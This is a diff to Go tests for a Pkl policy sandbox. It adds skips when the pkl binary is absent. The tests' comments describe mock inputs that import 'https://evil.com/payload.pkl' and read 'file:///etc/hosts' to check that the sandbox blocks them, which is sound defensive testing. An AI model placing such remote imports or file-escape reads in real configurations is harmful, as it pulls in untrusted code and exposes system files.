@@ -2,12 +2,16 @@ package policy
 
 import (
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"testing"
 )
 
 func TestPklSandboxBlocksExternalHTTP(t *testing.T) {
+	if _, err := exec.LookPath("pkl"); err != nil {
+		t.Skip("pkl binary not found in PATH; skipping test")
+	}
 	// Create a mock Pkl file that attempts: import "https://evil.com/payload.pkl"
 	tmpDir := t.TempDir()
 	policyPath := filepath.Join(tmpDir, "evil_http.pkl")
@@ -27,6 +31,9 @@ func TestPklSandboxBlocksExternalHTTP(t *testing.T) {
 }
 
 func TestPklSandboxBlocksFileEscape(t *testing.T) {
+	if _, err := exec.LookPath("pkl"); err != nil {
+		t.Skip("pkl binary not found in PATH; skipping test")
+	}
 	// Create a mock Pkl file that attempts: read("file:///etc/hosts")
 	tmpDir := t.TempDir()
 	policyPath := filepath.Join(tmpDir, "evil_file.pkl")
